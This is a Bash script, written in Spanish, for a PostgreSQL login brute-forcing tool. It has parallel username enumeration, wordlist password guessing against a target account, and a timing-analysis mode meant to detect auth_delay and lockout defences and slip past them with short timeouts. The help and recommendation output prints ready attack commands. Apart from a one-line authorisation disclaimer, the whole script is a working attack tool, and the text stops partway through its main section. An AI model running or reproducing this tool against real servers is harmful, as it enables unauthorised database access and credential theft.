#!/bin/bash
# =============================================================================
#  PG_BRUTEFORCE v2.1 - Herramienta de Auditoría Profesional PostgreSQL
#  Autor: Tu nombre aquí
#  Uso: Solo en sistemas con autorización explícita del propietario.
# =============================================================================

# --- Colores ---
GREEN='\033[1;32m'
RED='\033[1;31m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
MAGENTA='\033[1;35m'
WHITE='\033[1;37m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

VERSION="2.1"

HOST="127.0.0.1"; PORT="5432"; DB="postgres"
USER_DEFAULT="postgres"; PASS_DEFAULT="check_user_123"
USER_FILE=""; PASS_FILE=""
SKIP_PORT_CHECK=false; QUIET_MODE=false; OUTPUT_FILE=""
EXIT_ON_SUCCESS=false; CLI_TIMEOUT=5; CLI_TIMEOUT_EXPLICIT=false
WORKERS=1; ANALYZE_MODE=false; TIMING_SAMPLES=3; TIMING_THRESHOLD="0.3"

SESSION_BASE_DIR="${HOME}/.pg_bruteforce"
SESSION_FILE=""
SESSION_SUGGESTED_TIMEOUT=""; SESSION_HBA_ACEPTA_TODOS=""
SESSION_DELAY_TIPO=""; SESSION_TIMESTAMP=""

TEMP_DIR=$(mktemp -d /tmp/pg_bf_XXXXXX)
LOCK_FILE="$TEMP_DIR/output.lock"; OUT_LOCK="$TEMP_DIR/outfile.lock"
SUCCESS_FLAG="$TEMP_DIR/success.flag"

cleanup() {
    jobs -p 2>/dev/null | xargs -r kill 2>/dev/null
    wait 2>/dev/null; rm -rf "$TEMP_DIR" 2>/dev/null
}
trap cleanup EXIT INT TERM

mostrar_banner() {
    echo -e "${CYAN}"
    echo "  ██████   ██████     ██████  ██████  ██    ██ ████████ ███████"
    echo "  ██   ██ ██         ██   ██ ██   ██ ██    ██    ██    ██     "
    echo "  ██████  ██   ███   ██████  ██████  ██    ██    ██    █████  "
    echo "  ██      ██    ██   ██   ██ ██   ██ ██    ██    ██    ██     "
    echo "  ██       ██████    ██████  ██   ██  ██████     ██    ███████"
    echo -e "${WHITE}             v${VERSION} — Auditoría Profesional PostgreSQL${NC}"
    echo -e "${RED}  [!] Solo para uso ético y con autorización explícita del propietario.${NC}"
    echo ""
}

mostrar_ayuda() {
    mostrar_banner
    echo -e "${WHITE}${BOLD}USO:${NC}  $0 [opciones]\n"
    echo -e "${CYAN}${BOLD}CONEXIÓN:${NC}"
    printf "  %-18s %s\n" "-h <host>" "Host PostgreSQL.                     [Default: 127.0.0.1]"
    printf "  %-18s %s\n" "-p <port>" "Puerto.                              [Default: 5432]"
    printf "  %-18s %s\n" "-d <db>"   "Base de datos.                       [Default: postgres]"
    echo -e "\n${CYAN}${BOLD}ATAQUE:${NC}"
    printf "  %-18s %s\n" "-u <file>" "Archivo de usuarios (enumeración)."
    printf "  %-18s %s\n" "-f <file>" "Archivo de contraseñas (fuerza bruta)."
    printf "  %-18s %s\n" "-U <user>" "Usuario objetivo para -f.            [Default: postgres]"
    printf "  %-18s %s\n" "-P <pass>" "Contraseña base para -u."
    echo -e "\n${CYAN}${BOLD}RENDIMIENTO Y PARALELISMO:${NC}"
    printf "  %-18s %s\n" "-w <num>"  "Workers paralelos.                   [Default: 1]"
    printf "  %-18s %s\n" "-T <seg>"  "Timeout por intento. Si hay sesión y no se pasa -T,"
    echo    "                     se aplica el timeout sugerido por el análisis."
    echo    "                     Usar -T bajo para bypassear auth_delay (ej: -T 0.5)"
    echo -e "\n${CYAN}${BOLD}ANÁLISIS DE TIMING:${NC}"
    printf "  %-18s %s\n" "-A"        "Modo Análisis — detecta delay, tipo pg_hba, guarda sesión."
    printf "  %-18s %s\n" "-n <num>"  "Muestras para promediar tiempos.     [Default: 3]"
    printf "  %-18s %s\n" "-D <seg>"  "Umbral de detección de delay.        [Default: 0.3s]"
    echo -e "\n${CYAN}${BOLD}EXTRAS:${NC}"
    printf "  %-18s %s\n" "-S"        "Saltar validación de puerto TCP."
    printf "  %-18s %s\n" "-q"        "Modo silencioso: solo muestra hallazgos [->]."
    printf "  %-18s %s\n" "-x"        "Finalizar al primer acierto encontrado."
    printf "  %-18s %s\n" "-o <file>" "Guardar resultados en archivo con timestamps."
    printf "  %-18s %s\n" "-H"        "Mostrar este menú."
    echo -e "\n${CYAN}${BOLD}FLUJO RECOMENDADO:${NC}"
    echo -e "  ${DIM}# 1. Analizar (guarda sesión automáticamente):${NC}"
    echo    "  $0 -h 10.0.0.1 -A -U postgres -n 5"
    echo -e "  ${DIM}# 2. Los siguientes usan el timeout de sesión automáticamente:${NC}"
    echo    "  $0 -h 10.0.0.1 -u users.txt -w 8"
    echo    "  $0 -h 10.0.0.1 -U postgres -f rockyou.txt -w 4 -x -o result.log"
    echo ""
    exit 0
}

while getopts "h:p:d:U:P:u:f:So:qxHT:w:An:D:" opt; do
    case $opt in
        h) HOST=$OPTARG ;; p) PORT=$OPTARG ;; d) DB=$OPTARG ;;
        U) USER_DEFAULT=$OPTARG ;; P) PASS_DEFAULT=$OPTARG ;;
        u) USER_FILE=$OPTARG ;; f) PASS_FILE=$OPTARG ;;
        S) SKIP_PORT_CHECK=true ;; q) QUIET_MODE=true ;;
        x) EXIT_ON_SUCCESS=true ;; o) OUTPUT_FILE=$OPTARG ;;
        T) CLI_TIMEOUT=$OPTARG; CLI_TIMEOUT_EXPLICIT=true ;;
        w) WORKERS=$OPTARG ;; A) ANALYZE_MODE=true ;;
        n) TIMING_SAMPLES=$OPTARG ;; D) TIMING_THRESHOLD=$OPTARG ;;
        H) mostrar_ayuda ;; *) mostrar_ayuda ;;
    esac
done

mkdir -p "$SESSION_BASE_DIR" 2>/dev/null
SESSION_FILE="${SESSION_BASE_DIR}/session_$(echo "${HOST}_${PORT}_${DB}" | tr './:' '_').cfg"

log_msg() {
    local TIPO="$1" MSG="$2" COLOR="$3" PREFIJO="$4" TIEMPO="$5" STR_TIEMPO=""
    [[ -n "$TIEMPO" ]] && STR_TIEMPO=" [${TIEMPO}s]"
    if [ "$QUIET_MODE" = false ] || [ "$TIPO" = "SUCCESS" ]; then
        ( flock -x 200; echo -e "${COLOR}${PREFIJO}${STR_TIEMPO} ${MSG}${NC}" ) 200>"$LOCK_FILE"
    fi
    if [[ -n "$OUTPUT_FILE" ]]; then
        ( flock -x 201
          echo "[$(date +'%Y-%m-%d %H:%M:%S')] [$TIPO]${STR_TIEMPO} $MSG" >> "$OUTPUT_FILE"
        ) 201>"$OUT_LOCK"
    fi
}

# ── SESIÓN ──────────────────────────────────────────────────────────────────

generar_usuario_falso() {
    local rnd
    rnd=$(cat /dev/urandom 2>/dev/null | tr -dc 'a-z0-9' | head -c 12 2>/dev/null)
    [[ -z "$rnd" ]] && rnd="xrnd$(date +%N | tail -c 6)"
    echo "pgbf_probe_${rnd}"
}

guardar_sesion() {
    mkdir -p "$SESSION_BASE_DIR" 2>/dev/null
    cat > "$SESSION_FILE" << EOF
# PG_BRUTEFORCE Session — generado automáticamente
HOST=$HOST
PORT=$PORT
DB=$DB
SUGGESTED_TIMEOUT=$1
HBA_ACEPTA_TODOS=$2
DELAY_TIPO=$3
TIMESTAMP=$(date +'%Y-%m-%d %H:%M:%S')
EOF
    echo -e "${GREEN}[✔] Sesión guardada en: ${WHITE}$SESSION_FILE${NC}"
}

cargar_sesion() {
    [[ ! -f "$SESSION_FILE" ]] && return 1
    local s_host s_port s_db
    s_host=$(grep "^HOST=" "$SESSION_FILE" | cut -d= -f2)
    s_port=$(grep "^PORT=" "$SESSION_FILE" | cut -d= -f2)
    s_db=$(grep   "^DB="   "$SESSION_FILE" | cut -d= -f2)
    [[ "$s_host" != "$HOST" || "$s_port" != "$PORT" || "$s_db" != "$DB" ]] && return 1
    SESSION_SUGGESTED_TIMEOUT=$(grep "^SUGGESTED_TIMEOUT=" "$SESSION_FILE" | cut -d= -f2)
    SESSION_HBA_ACEPTA_TODOS=$(grep  "^HBA_ACEPTA_TODOS="  "$SESSION_FILE" | cut -d= -f2)
    SESSION_DELAY_TIPO=$(grep        "^DELAY_TIPO="         "$SESSION_FILE" | cut -d= -f2)
    SESSION_TIMESTAMP=$(grep         "^TIMESTAMP="          "$SESSION_FILE" | cut -d= -f2-)
    return 0
}

mostrar_sesion_cargada() {
    echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}${BOLD}║           SESIÓN PREVIA DETECTADA (-A)               ║${NC}"
    echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════════╝${NC}"
    printf "  ${WHITE}%-28s${CYAN}%s${NC}\n" "Analizado el:"        "$SESSION_TIMESTAMP"
    printf "  ${WHITE}%-28s${CYAN}%s${NC}\n" "Tipo de delay:"       "$SESSION_DELAY_TIPO"
    printf "  ${WHITE}%-28s${CYAN}%s${NC}\n" "pg_hba acepta todos:" "$SESSION_HBA_ACEPTA_TODOS"
    printf "  ${WHITE}%-28s${CYAN}%s${NC}\n" "Timeout sugerido:"    "${SESSION_SUGGESTED_TIMEOUT}s"
    if [ "$CLI_TIMEOUT_EXPLICIT" = false ] && [[ -n "$SESSION_SUGGESTED_TIMEOUT" ]]; then
        printf "  ${GREEN}%-28s${GREEN}%s${NC}\n" "→ Aplicando timeout:" \
               "${SESSION_SUGGESTED_TIMEOUT}s  (sesión — usa -T para sobreescribir)"
    else
        printf "  ${YELLOW}%-28s${YELLOW}%s${NC}\n" "→ Timeout manual:" \
               "${CLI_TIMEOUT}s  (sobreescribe la sesión)"
    fi
    echo ""
}

# ── PRE-CHECK pg_hba ─────────────────────────────────────────────────────────
# Retorna: 0=acepta todos, 1=selectivo, 2=indeterminado
verificar_hba_acepta_todos() {
    local fake_user; fake_user=$(generar_usuario_falso)
    local fake_pass="Pr0b3_$(date +%N | tail -c 5)"
    local RES; RES=$(PGPASSWORD="$fake_pass" timeout "${CLI_TIMEOUT}s" psql \
        -h "$HOST" -p "$PORT" -d "$DB" -U "$fake_user" -c "SELECT 1" 2>&1)
    local status=$?
    if   [ "$status" -eq 124 ];                            then return 2
    elif [[ "$RES" == *"password authentication failed"* ]]; then return 0
    elif [[ "$RES" == *"no pg_hba.conf entry"* ]];          then return 1
    elif [[ "$RES" == *"role"*"does not exist"* ]];         then return 1
    elif [[ "$RES" == *"Connection refused"* ]] || [[ "$RES" == *"could not connect"* ]]; then return 2
    else return 2
    fi
}

advertencia_hba_acepta_todos() {
    local modo="${1:-abort}" fake_user="${2:-pgbf_probe_xxx}"
    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║    ⚠  ADVERTENCIA: ENUMERACIÓN DE USUARIOS INÚTIL  ⚠        ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${WHITE}El servidor respondió ${YELLOW}\"password authentication failed\"${WHITE} para el"
    echo -e "  usuario de prueba ficticio: ${CYAN}${fake_user}${NC}"
    echo ""
    echo -e "  ${WHITE}Esto indica que en ${CYAN}pg_hba.conf${WHITE} la columna USER está configurada"
    echo -e "  como ${YELLOW}all${WHITE} — PostgreSQL pasa CUALQUIER nombre a autenticación."
    echo ""
    echo -e "  ${WHITE}${BOLD}¿Por qué la enumeración es inútil?${NC}"
    echo -e "  Todos los usuarios de tu lista responderán ${GREEN}\"requiere contraseña\"${NC},"
    echo -e "  existan o no en el catálogo. ${RED}No es posible distinguirlos.${NC}"
    echo ""
    echo -e "  ${WHITE}${BOLD}¿Qué hacer?${NC}"
    echo -e "  → Ataca contraseñas de un usuario conocido (ej: postgres):"
    echo -e "    ${CYAN}$0 -h $HOST -p $PORT -U postgres -f <wordlist> -w 4${NC}"
    echo -e "  → Usa -A de timing para optimizar el ataque de contraseñas."
    echo ""
    if [ "$modo" = "abort" ]; then
        echo -e "  ${RED}${BOLD}[ABORTADO] La enumeración de usuarios ha sido cancelada.${NC}"
        echo ""
    fi
}

# ── DEPENDENCIAS Y PUERTO ─────────────────────────────────────────────────────

verificar_dependencias() {
    local missing=()
    for cmd in psql bc timeout flock; do
        command -v "$cmd" &>/dev/null || missing+=("$cmd")
    done
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${RED}[ERROR] Dependencias faltantes: ${missing[*]}${NC}"
        echo -e "${YELLOW}  Instalar: sudo apt install postgresql-client bc coreutils util-linux${NC}"
        exit 1
    fi
}

validar_puerto() {
    [ "$QUIET_MODE" = false ] && echo -ne "${CYAN}[*] Validando alcance a $HOST:$PORT ... ${NC}"
    if ! timeout 3s bash -c "echo > /dev/tcp/$HOST/$PORT" 2>/dev/null; then
        echo ""; log_msg "ERROR" "No hay alcance al puerto $PORT en $HOST." "$RED" "[X]"; exit 1
    fi
    [ "$QUIET_MODE" = false ] && echo -e "${GREEN}OK${NC}"
}

# ── MEDICIÓN DE TIEMPOS ───────────────────────────────────────────────────────

medir_tiempo_respuesta() {
    local username="$1" password="$2" samples="${3:-$TIMING_SAMPLES}" total="0"
    for ((i=0; i<samples; i++)); do
        local t_start t_end elapsed
        t_start=$(date +%s%N)
        PGPASSWORD="$password" timeout "${CLI_TIMEOUT}s" psql \
            -h "$HOST" -p "$PORT" -d "$DB" -U "$username" -c "SELECT 1" >/dev/null 2>&1
        t_end=$(date +%s%N)
        elapsed=$(echo "scale=6; ($t_end - $t_start) / 1000000000" | bc)
        total=$(echo "scale=6; $total + $elapsed" | bc)
    done
    echo "scale=4; $total / $samples" | bc
}

medir_tcp() {
    local samples="${1:-$TIMING_SAMPLES}" total="0"
    for ((i=0; i<samples; i++)); do
        local t_start t_end elapsed
        t_start=$(date +%s%N)
        timeout 3s bash -c "echo > /dev/tcp/$HOST/$PORT" 2>/dev/null
        t_end=$(date +%s%N)
        elapsed=$(echo "scale=6; ($t_end - $t_start) / 1000000000" | bc)
        total=$(echo "scale=6; $total + $elapsed" | bc)
    done
    echo "scale=4; $total / $samples" | bc
}

# ── MODO ANÁLISIS ─────────────────────────────────────────────────────────────

modo_analisis() {
    local FAKE_USER FAKE_PASS
    FAKE_USER=$(generar_usuario_falso)
    FAKE_PASS="Pr0b3_$(cat /dev/urandom 2>/dev/null | tr -dc 'A-Za-z0-9' | head -c 10 2>/dev/null || date +%N)"

    echo -e "\n${CYAN}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║        ANÁLISIS DE TIMING — TÉCNICA TRES TIEMPOS         ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}\n"
    echo -e "  ${WHITE}Servidor:           ${CYAN}$HOST:$PORT${NC}"
    echo -e "  ${WHITE}Base de datos:      ${CYAN}$DB${NC}"
    echo -e "  ${WHITE}Usuario objetivo:   ${CYAN}$USER_DEFAULT${NC}"
    echo -e "  ${WHITE}Muestras/medición:  ${CYAN}$TIMING_SAMPLES${NC}"
    echo -e "  ${WHITE}Umbral de delay:    ${CYAN}${TIMING_THRESHOLD}s${NC}"
    echo -e "  ${WHITE}Sesión se guardará: ${CYAN}${SESSION_FILE}${NC}\n"

    # ── PRE-CHECK pg_hba ────────────────────────────────────────────────────
    echo -e "${CYAN}${BOLD}[PRE-CHECK]${NC} Verificando comportamiento de pg_hba.conf..."
    echo -e "  ${DIM}→ Sondeando con usuario ficticio: ${FAKE_USER}${NC}"
    local HBA_TODOS=false
    local RES_PROBE
    RES_PROBE=$(PGPASSWORD="$FAKE_PASS" timeout "${CLI_TIMEOUT}s" psql \
        -h "$HOST" -p "$PORT" -d "$DB" -U "$FAKE_USER" -c "SELECT 1" 2>&1)

    if [[ "$RES_PROBE" == *"password authentication failed"* ]]; then
        HBA_TODOS=true
        # En modo análisis: ALERTA sin abortar
        advertencia_hba_acepta_todos "warn" "$FAKE_USER"
        echo -e "${YELLOW}  ⚠  El análisis continúa para completar el diagnóstico, pero la${NC}"
        echo -e "${YELLOW}     enumeración de usuarios NO funcionará con esta configuración.${NC}\n"
    elif [[ "$RES_PROBE" == *"no pg_hba.conf entry"* ]]; then
        echo -e "  ${GREEN}[✔] pg_hba SELECTIVO — la enumeración de usuarios SÍ puede funcionar.${NC}\n"
    elif [[ "$RES_PROBE" == *"role"*"does not exist"* ]]; then
        echo -e "  ${GREEN}[✔] El método de auth delata la existencia de usuarios.${NC}\n"
    else
        echo -e "  ${YELLOW}[?] Respuesta ambigua: $(echo "$RES_PROBE" | head -1)${NC}\n"
    fi

    # ── TRES TIEMPOS ────────────────────────────────────────────────────────
    echo -e "${CYAN}${BOLD}[PASO 1/3]${NC} Midiendo latencia TCP (baseline de red)..."
    local T_TCP; T_TCP=$(medir_tcp "$TIMING_SAMPLES")
    echo -e "  ${GREEN}↳ Tiempo TCP promedio: ${WHITE}${T_TCP}s${NC}\n"

    echo -e "${CYAN}${BOLD}[PASO 2/3]${NC} Midiendo respuesta con usuario INEXISTENTE (${FAKE_USER})..."
    local T_FAKE; T_FAKE=$(medir_tiempo_respuesta "$FAKE_USER" "$FAKE_PASS")
    echo -e "  ${GREEN}↳ Tiempo promedio: ${WHITE}${T_FAKE}s${NC}\n"

    echo -e "${CYAN}${BOLD}[PASO 3/3]${NC} Midiendo respuesta con usuario OBJETIVO (${USER_DEFAULT})..."
    local T_TARGET; T_TARGET=$(medir_tiempo_respuesta "$USER_DEFAULT" "$FAKE_PASS")
    echo -e "  ${GREEN}↳ Tiempo promedio: ${WHITE}${T_TARGET}s${NC}\n"

    local DIFF; DIFF=$(echo "scale=4; $T_TARGET - $T_FAKE" | bc)

    echo -e "${WHITE}${BOLD}─────────────────── RESUMEN DE MEDICIONES ─────────────────────${NC}"
    printf "  %-42s ${CYAN}%s${NC}\n" "Tiempo TCP (baseline):"            "${T_TCP}s"
    printf "  %-42s ${CYAN}%s${NC}\n" "Tiempo usuario inexistente:"        "${T_FAKE}s"
    printf "  %-42s ${CYAN}%s${NC}\n" "Tiempo usuario objetivo ($USER_DEFAULT):" "${T_TARGET}s"
    printf "  %-42s ${YELLOW}%s${NC}\n" "Diferencia:"                      "${DIFF}s"
    printf "  %-42s ${YELLOW}%s${NC}\n" "Umbral:"                           "${TIMING_THRESHOLD}s"
    printf "  %-42s ${YELLOW}%s${NC}\n" "pg_hba acepta todos:" \
           "$( [ "$HBA_TODOS" = true ] && echo 'SÍ ⚠' || echo 'No')"
    echo ""

    local DIFF_SIG FAKE_HIGH TARGET_HIGH SUGGESTED_T DELAY_TIPO
    DIFF_SIG=$(echo   "$DIFF > $TIMING_THRESHOLD" | bc -l 2>/dev/null)
    FAKE_HIGH=$(echo  "$T_FAKE > 0.5"             | bc -l 2>/dev/null)
    TARGET_HIGH=$(echo "$T_TARGET > 0.5"          | bc -l 2>/dev/null)

    if [ "$DIFF_SIG" = "1" ]; then
        echo -e "${GREEN}${BOLD}[✔] DELAY SELECTIVO — usuario '${USER_DEFAULT}' probablemente EXISTE${NC}"
        DELAY_TIPO="selectivo"
        echo -e "\n${CYAN}[*] Verificando penalización progresiva (credcheck)...${NC}"
        local T_TARGET2; T_TARGET2=$(medir_tiempo_respuesta "$USER_DEFAULT" "${FAKE_PASS}2" 1)
        local INCR; INCR=$(echo "scale=4; $T_TARGET2 - $T_TARGET" | bc)
        local IS_GROWING; IS_GROWING=$(echo "$INCR > 0.8" | bc -l 2>/dev/null)
        if [ "$IS_GROWING" = "1" ]; then
            echo -e "${RED}${BOLD}[!!] DEFENSA ACTIVA — penalización progresiva. RIESGO DE LOCKOUT.${NC}"
            echo -e "${RED}     1er intento: ${T_TARGET}s → 2do: ${T_TARGET2}s (Δ ${INCR}s)${NC}"
            DELAY_TIPO="activo"; SUGGESTED_T=$(echo "scale=1; $T_TARGET2 + 2.0" | bc)
        else
            echo -e "${GREEN}     Sin penalización progresiva detectada.${NC}"
            SUGGESTED_T=$(echo "scale=1; $T_FAKE + 0.5" | bc)
        fi
    elif [ "$FAKE_HIGH" = "1" ] && [ "$TARGET_HIGH" = "1" ]; then
        echo -e "${YELLOW}${BOLD}[!] DELAY GLOBAL — no se puede enumerar usuarios por timing.${NC}"
        DELAY_TIPO="global"; SUGGESTED_T=$(echo "scale=1; $T_TARGET + 1.0" | bc)
    else
        echo -e "${GREEN}${BOLD}[✔] SIN DELAY — servidor rápido, blanco ideal para ataque directo.${NC}"
        DELAY_TIPO="ninguno"; SUGGESTED_T="2.0"
        local NEG_DIFF; NEG_DIFF=$(echo "$DIFF < 0" | bc -l 2>/dev/null)
        [ "$NEG_DIFF" = "1" ] && \
            echo -e "${YELLOW}    Varianza de red — considera más muestras con -n 10.${NC}"
    fi

    echo -e "\n${YELLOW}${BOLD}[RECOMENDACIONES]:${NC}"
    if [ "$HBA_TODOS" = true ]; then
        echo -e "  ${RED}⚠  Enumeración inútil (pg_hba acepta todos). Ataca contraseñas directamente:${NC}"
        echo -e "     ${CYAN}$0 -h $HOST -p $PORT -U $USER_DEFAULT -f <wordlist> -T $SUGGESTED_T -w 4${NC}"
    else
        [ "$DELAY_TIPO" = "selectivo" ] && {
            echo -e "  → Bypass de delay (usuarios reales → [!] TIMEOUT, ficticios → [X]):"
            echo -e "     ${CYAN}$0 -h $HOST -p $PORT -u <users.txt> -T $SUGGESTED_T -w 8 -q${NC}"
        }
        echo -e "  → Fuerza bruta con timeout ajustado:"
        echo -e "     ${CYAN}$0 -h $HOST -p $PORT -U $USER_DEFAULT -f <wordlist> -T $SUGGESTED_T -w 4${NC}"
    fi
    echo -e "  ${DIM}(Sin -T explícito, los próximos comandos usarán ${SUGGESTED_T}s desde la sesión)${NC}"

    # ── Análisis de lista de usuarios si se combinó con -u ──────────────────
    if [[ -n "$USER_FILE" ]] && [[ -f "$USER_FILE" ]]; then
        echo -e "\n${CYAN}${BOLD}═══════════ ANÁLISIS TIMING — LISTA DE USUARIOS ═══════════${NC}"
        if [ "$HBA_TODOS" = true ]; then
            echo -e "${RED}  ⚠  Se omite: pg_hba acepta todos — los tiempos no distinguen usuarios.${NC}"
        else
            echo -e "${WHITE}[*] Ref: ${CYAN}${T_FAKE}s${WHITE} | Umbral: ${CYAN}${TIMING_THRESHOLD}s${NC}\n"
            local count_valid=0 count_total=0
            while IFS= read -r username; do
                [[ -z "$username" || "$username" =~ ^# ]] && continue
                count_total=$((count_total + 1))
                local T_USR DIFF_USR SIG
                T_USR=$(medir_tiempo_respuesta "$username" "$FAKE_PASS" 1)
                DIFF_USR=$(echo "scale=4; $T_USR - $T_FAKE" | bc)
                SIG=$(echo "$DIFF_USR > $TIMING_THRESHOLD" | bc -l 2>/dev/null)
                if [ "$SIG" = "1" ]; then
                    count_valid=$((count_valid + 1))
                    echo -e "${GREEN}[->] POSIBLE VÁLIDO: '${username}' (${T_USR}s, Δ${DIFF_USR}s)${NC}"
                    [[ -n "$OUTPUT_FILE" ]] && \
                        (flock -x 201; echo "[$(date +'%Y-%m-%d %H:%M:%S')] [TIMING-VALID] Usuario: '$username' T=${T_USR}s Delta=${DIFF_USR}s" >> "$OUTPUT_FILE") 201>"$OUT_LOCK"
                else
                    [ "$QUIET_MODE" = false ] && echo -e "${RED}[X]  '${username}' (${T_USR}s, Δ${DIFF_USR}s)${NC}"
                fi
            done < "$USER_FILE"
            echo -e "\n${WHITE}${BOLD}[RESUMEN] Analizados: ${count_total} | Posibles válidos: ${count_valid}${NC}"
        fi
    fi

    [[ -n "$OUTPUT_FILE" ]] && \
        echo "[$(date +'%Y-%m-%d %H:%M:%S')] [ANALYZE] Host=$HOST:$PORT T_TCP=${T_TCP}s T_FAKE=${T_FAKE}s T_TARGET=${T_TARGET}s DIFF=${DIFF}s DelayTipo=${DELAY_TIPO} HBA_Todos=${HBA_TODOS} SuggestedT=${SUGGESTED_T}s" >> "$OUTPUT_FILE"

    echo -e "\n${CYAN}${BOLD}═══════════════════ GUARDANDO SESIÓN ═══════════════════${NC}"
    guardar_sesion "$SUGGESTED_T" "$HBA_TODOS" "$DELAY_TIPO"
    echo -e "\n${CYAN}${BOLD}════════════════════ FIN DEL ANÁLISIS ════════════════════${NC}\n"
}

# ── WORKERS ───────────────────────────────────────────────────────────────────

worker_usuarios() {
    local worker_id="$1" total_workers="$2"
    awk -v w="$worker_id" -v n="$total_workers" \
        'NR % n == w % n && length($0) > 0 && !/^#/' "$USER_FILE" | \
    while IFS= read -r username; do
        [ -f "$SUCCESS_FLAG" ] && return 0
        local t_start t_end duration RES status
        t_start=$(date +%s%N)
        RES=$(PGPASSWORD="$PASS_DEFAULT" timeout "${CLI_TIMEOUT}s" psql \
            -h "$HOST" -p "$PORT" -d "$DB" -U "$username" -c "SELECT 1" 2>&1)
        status=$?; t_end=$(date +%s%N)
        duration=$(echo "scale=3; ($t_end - $t_start) / 1000000000" | bc)
        [ -f "$SUCCESS_FLAG" ] && return 0
        if   [ "$status" -eq 124 ]; then
            log_msg "TIMEOUT" "Timeout (>${CLI_TIMEOUT}s) → Posible usuario válido: '${username}'" "$YELLOW" "[!]" "$duration"
        elif [[ "$RES" == *"password authentication failed"* ]]; then
            log_msg "SUCCESS" "Usuario VÁLIDO: '${username}' (requiere contraseña)" "$GREEN" "[->]" "$duration"
            touch "$SUCCESS_FLAG"; [ "$EXIT_ON_SUCCESS" = true ] && return 0
        elif [[ "$RES" == *"SELECT 1"* ]]; then
            log_msg "SUCCESS" "¡ACCESO DIRECTO! Usuario '${username}' sin contraseña" "$YELLOW" "[->]" "$duration"
            touch "$SUCCESS_FLAG"; [ "$EXIT_ON_SUCCESS" = true ] && return 0
        elif [[ "$RES" == *"database \"$DB\" does not exist"* ]]; then
            log_msg "SUCCESS" "Usuario VÁLIDO: '${username}' (DB '$DB' no existe pero el rol sí)" "$YELLOW" "[->]" "$duration"
            touch "$SUCCESS_FLAG"; [ "$EXIT_ON_SUCCESS" = true ] && return 0
        elif [[ "$RES" == *"no pg_hba.conf entry"* ]]; then
            log_msg "DENIED"  "Usuario '${username}' denegado por pg_hba.conf" "$RED" "[X]" "$duration"
        elif [[ "$RES" == *"role \"$username\" does not exist"* ]]; then
            log_msg "INFO"    "Usuario '${username}' no existe." "$RED" "[X]" "$duration"
        elif [[ "$RES" == *"Connection refused"* ]] || [[ "$RES" == *"could not connect"* ]]; then
            log_msg "ERROR"   "Error de conexión para '${username}': $(echo "$RES" | head -1)" "$RED" "[!!]" "$duration"
        else
            log_msg "UNKNOWN" "Respuesta inesperada para '${username}': $(echo "$RES" | head -1)" "$YELLOW" "[?]" "$duration"
        fi
    done
}

worker_passwords() {
    local worker_id="$1" total_workers="$2"
    awk -v w="$worker_id" -v n="$total_workers" \
        'NR % n == w % n && length($0) > 0 && !/^#/' "$PASS_FILE" | \
    while IFS= read -r password; do
        [ -f "$SUCCESS_FLAG" ] && return 0
        local t_start t_end duration RES status
        t_start=$(date +%s%N)
        RES=$(PGPASSWORD="$password" timeout "${CLI_TIMEOUT}s" psql \
            -h "$HOST" -p "$PORT" -d "$DB" -U "$USER_DEFAULT" -c "SELECT 1" 2>&1)
        status=$?; t_end=$(date +%s%N)
        duration=$(echo "scale=3; ($t_end - $t_start) / 1000000000" | bc)
        [ -f "$SUCCESS_FLAG" ] && return 0
        if   [ "$status" -eq 124 ]; then
            log_msg "TIMEOUT" "Timeout (>${CLI_TIMEOUT}s) con pass: '${password}'" "$YELLOW" "[!]" "$duration"
        elif [ "$status" -eq 0 ]; then
            log_msg "SUCCESS" "¡CONTRASEÑA ENCONTRADA! → ${USER_DEFAULT}:${password}" "$GREEN" "[->]" "$duration"
            touch "$SUCCESS_FLAG"; return 0
        elif [[ "$RES" == *"database \"$DB\" does not exist"* ]]; then
            log_msg "SUCCESS" "Contraseña válida: '${password}' (DB '$DB' no existe, pero auth pasó)" "$YELLOW" "[->]" "$duration"
            touch "$SUCCESS_FLAG"; return 0
        else
            log_msg "FAIL" "Fallido: ${password}" "$RED" "[X]" "$duration"
        fi
    done
}

lanzar_workers() {
    local mode="$1" input_file total_lines
    [ "$mode" = "users" ] && input_file="$USER_FILE" || input_file="$PASS_FILE"
    total_lines=$(grep -c -v '^#\|^[[:space:]]*$' "$input_file" 2>/dev/null || wc -l < "$input_file")
    local effective_workers=$WORKERS
    if [ "$total_lines" -lt "$WORKERS" ]; then
        effective_workers=$total_lines
        [ "$QUIET_MODE" = false ] && \
            echo -e "${YELLOW}[*] Lista pequeña ($total_lines entradas). Ajustando workers a: $effective_workers${NC}"
    fi
    [ "$QUIET_MODE" = false ] && {
        local attack_label
        [ "$mode" = "users" ] && attack_label="Enumeración de usuarios" \
                               || attack_label="Fuerza bruta → ${USER_DEFAULT}"
        echo -e "${CYAN}[!] ${attack_label}${NC}"
        echo -e "${CYAN}    Lista: ${WHITE}${input_file}${CYAN} | Entradas: ${WHITE}${total_lines}${CYAN} | Workers: ${WHITE}${effective_workers}${CYAN} | Timeout: ${WHITE}${CLI_TIMEOUT}s${NC}"
        echo -e "${DIM}─────────────────────────────────────────────────────${NC}"
    }
    local pids=()
    for ((i = 0; i < effective_workers; i++)); do
        if [ "$mode" = "users" ]; then worker_usuarios "$i" "$effective_workers" &
        else worker_passwords "$i" "$effective_workers" &
        fi
        pids+=($!)
    done
    for pid in "${pids[@]}"; do wait "$pid" 2>/dev/null; done
    [ -f "$SUCCESS_FLAG" ] && [ "$EXIT_ON_SUCCESS" = true ] && [ "$QUIET_MODE" = false ] && \
        echo -e "\n${GREEN}[*] Objetivo alcanzado. Workers finalizados.${NC}"
}

# ── MAIN ──────────────────────────────────────────────────────────────────────

[ "$QUIET_MODE" = false ] && mostrar_banner
verificar_dependencias
[ "$SKIP_PORT_CHECK" = false ] && validar_puerto

# Cargar sesión previa
SESSION_LOADED=false
if cargar_sesion; then
    SESSION_LOADED=true
